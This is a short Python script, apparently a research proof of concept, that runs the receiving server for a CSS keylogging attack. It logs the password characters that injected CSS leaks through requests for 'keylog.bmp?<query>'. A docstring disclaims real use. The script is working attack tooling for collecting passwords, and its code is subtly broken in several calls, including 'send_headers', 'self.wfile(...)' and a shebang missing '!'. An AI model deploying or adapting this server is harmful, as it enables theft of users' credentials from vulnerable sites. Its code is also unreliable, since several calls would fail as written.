#/usr/bin/env python3

"""
This is for research only!
I am NOT using it (after all, my website is static), and
I consider it highly unethical to use. I am merely demonstrating
a vulnerability.
"""

from http.server import HTTPServer, SimpleHTTPRequestHandler
from argparse import ArgumentParser
import sys


# TODO: use metaclass to make uninstantiable, it's a namespace not a class
class CSSKeyLogger:
    """CSS Key logging server components"""

    class ReqHandler(SimpleHTTPRequestHandler):
        """
        handles requests to the server for keylogging,
        while also accessing the file system
        """

        def do_GET(self):
            """handle GET requests"""

            req = self
            print(req.path)
            _, _, resrc_and_query = req.path.partition('/') 
            resrc, _, query = resrc_and_query.rpartition('?')


            if resrc == 'keylog.bmp':
                self.send_response(200)
                self.send_headers('Content-type', 'image/bmp')
                self.end_headers()
                print(f'password contains "{query}"')
                with open('skull.bmp', 'rb') as img:
                    self.wfile(img.read())
            else:
                return super().do_GET()


    class Server(HTTPServer):  # TODO: add threading mixin
        """Server with custom request handler"""
        def __init__(self, host='localhost', port=8000):
            super().__init__((host, port), CSSKeyLogger.ReqHandler)


if __name__ == '__main__':
    argparser = ArgumentParser(description='Run the server')
    argparser.add_argument('-p', '--port',
                           metavar=int,
                           default=8000,
                           help='the port to serve from')
    argparser.add_argument('-i', '--host',
                           default='localhost',
                           help='the host address to serve from')
    args = argparser.parse_args()
    httpd = CSSKeyLogger.Server(args.host, args.port)
    try:
        print(f'serving at http://{args.host}:{args.port}')
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('exiting')
        sys.exit(0)
